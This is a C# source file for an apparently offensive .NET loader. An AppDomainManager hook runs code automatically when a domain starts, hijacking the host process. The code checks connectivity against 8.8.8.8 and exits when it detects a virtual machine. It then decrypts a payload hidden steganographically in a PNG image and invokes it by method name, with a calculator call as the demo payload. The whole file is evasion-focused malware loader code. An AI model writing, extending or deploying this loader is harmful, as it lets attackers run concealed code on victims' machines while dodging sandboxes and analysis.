using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

public sealed class MyAppDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        ClassExample.Execute();
        /*        bool res = ClassExample.Execute();

                return;*/
    }
}

public class ClassExample
{
    public static void Execute()
    {
        // hardcode args here
        string[] args = new string[] { "8.8.8.8", "-antivm", "-stegload", @".\Logo_copy.png", "Calc.Modes.RunCalc.Execute" };
        Program.Main(args);
    }
}


public class Program
{

    public static void Main(string[] args)
    {
        bool noDNS = args.Contains("-NoDNS", StringComparer.OrdinalIgnoreCase);

        // If noDNS is not specified, perform DNS check
        if (!noDNS)
        {
            string inputIPAddress = args.FirstOrDefault(arg => !arg.StartsWith("-"));
            if (string.IsNullOrEmpty(inputIPAddress))
            {
                Console.WriteLine("DNS");
                return;
            }
            DNSCheck.CheckDNSAndContinue(inputIPAddress);
        }

        if (args.Contains("-antivm", StringComparer.OrdinalIgnoreCase))
        {
            // Check for virtualization
            if (Virtualization.Execute())
            {
                Console.WriteLine("Virtual machine detected. Exiting...");
                Environment.Exit(1);
            }
            /*            else
                        {
                            Console.WriteLine("No sandbox or debuggers found.");
                        }*/
        }

        if (args.Contains("-stegload", StringComparer.OrdinalIgnoreCase))
        {
            string imageFilePath = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
            string methodSignature = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

            if (string.IsNullOrEmpty(methodSignature))
            {
                Console.WriteLine("Error: Method signature must be provided e.x. Calc.Modes.RunCalc.Execute");
                return;
            }

            try
            {
                Steg.ExStegDecryptAndLoad(imageFilePath, methodSignature);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error extracting hash, decrypting data, or invoking method: {ex.Message}");
            }
            return;
        }
    }
}
